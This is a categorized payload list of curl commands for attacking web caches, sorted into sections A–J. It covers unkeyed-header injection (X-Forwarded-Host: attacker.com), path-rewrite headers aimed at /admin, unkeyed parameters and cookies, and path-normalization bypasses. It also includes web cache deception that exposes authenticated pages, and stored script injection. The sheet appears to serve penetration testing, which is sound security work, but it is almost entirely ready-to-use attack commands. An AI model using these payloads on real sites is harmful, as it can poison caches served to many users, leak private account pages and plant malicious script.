# Payload dictionary — every cache-poisoning payload, categorized

The complete payload corpus — each vector, each carrier, each check.

---

## A. The cache-status payloads — the cache-detection

```bash
# the cache status headers — a HIT/MISS/AGE check
curl -sI "$BASE/" | grep -iE 'x-cache|cf-cache|age:|via:|x-varnish|x-served-by|server:|cache-status'
#   X-Cache-Status: HIT/MISS — an nginx proxy_cache
#   CF-Cache-Status: HIT — a Cloudflare cache
#   Age: N — a cached copy's age
#   X-Served-By: cache — a Varnish/CDN
# the Vary header — the key's discriminator
curl -sI "$BASE/" | grep -i 'vary'
```

## B. The unkeyed-header payloads — the classic vector

```bash
# the X-Forwarded-Host — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the X-Original-URL — a path-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Original-URL: /admin'
# the X-Rewrite-URL — a path-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Rewrite-URL: /admin'
# the X-Forwarded-Scheme — a scheme-downgrade
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: http'
# the X-Forwarded-Server — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Server: attacker.com'
# the X-Host — a host-rewrite
curl "$BASE/page?cb=<unique>" -H 'X-Host: attacker.com'
# the Referer — a reflected header
curl "$BASE/page?cb=<unique>" -H 'Referer: attacker.com/<payload>'
# the User-Agent — a reflected header
curl "$BASE/page?cb=<unique>" -A '<payload>'
# the Accept-Language — a localized response
curl "$BASE/page?cb=<unique>" -H 'Accept-Language: <payload>'
# a custom X- header — a reflected header
curl "$BASE/page?cb=<unique>" -H 'X-Custom: <payload>'
```

## C. The unkeyed-parameter payloads — a query the cache ignores

```bash
# a tracking param — utm, fbclid, gclid — the cache ignores
curl "$BASE/page?cb=<unique>&utm_source=<payload>"
curl "$BASE/page?cb=<unique>&fbclid=<payload>"
curl "$BASE/page?cb=<unique>&gclid=<payload>"
# a param the app reflects — a payload carrier
curl "$BASE/page?cb=<unique>&q=<payload>"
curl "$BASE/page?cb=<unique>&search=<payload>"
```

## D. The cookie payloads — a per-cookie response

```bash
# a cookie the app reads but the cache ignores
curl "$BASE/page?cb=<unique>" -H 'Cookie: theme=<payload>'
curl "$BASE/page?cb=<unique>" -H 'Cookie: lang=<payload>'
curl "$BASE/page?cb=<unique>" -H 'Cookie: prefs=<payload>'
```

## E. The path-normalization payloads — a URL confusion

```bash
# a path the cache and the app normalize differently
curl "$BASE/page/../admin?cb=<unique>"
curl "$BASE/page%2f..%2fadmin?cb=<unique>"
curl "$BASE/page/..;/admin?cb=<unique>"
curl "$BASE/static/../admin?cb=<unique>"
curl "$BASE/page//admin?cb=<unique>"
curl "$BASE/page/.;/admin?cb=<unique>"
```

## F. The authenticated-page-served-anonymously payloads — the deception

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # anonymous — HIT?
#   the anonymous request returns the authenticated page → deception
```

## G. The injection payloads — the stored content

```bash
# a reflected unkeyed input carries a payload — the stored copy serves it
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com/<script>'
# a charset-injection — the verified card's shape
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
# a payload in a reflected parameter
curl "$BASE/page?cb=<unique>&q=<script>alert(1)</script>"
```

## H. The cache-buster payloads — the key-append

```bash
# a keyed param the app ignores — a fresh entry, not a poisoned one
curl "$BASE/page?cb=<unique>&_=<random>"
curl "$BASE/page?cb=<unique>&nocache=<random>"
```

## I. The confirmation payloads — the clean-request read

```bash
# the poisoning request — the stored copy carries the marker
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
# the clean request — a different session, the same URL
curl "$BASE/page?cb=<unique>"   # does it reflect <marker>?
#   <marker> reflected → poisoned → confirmed
#   the cache-status shows HIT — the stored copy served YOUR input
```

## J. The TTL payloads — the expiry check

```bash
# the stored entry's age — the TTL's remaining window
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'age|cache-control|expires'
#   Age: N — the copy's age
#   Cache-Control: max-age=N — the TTL
```
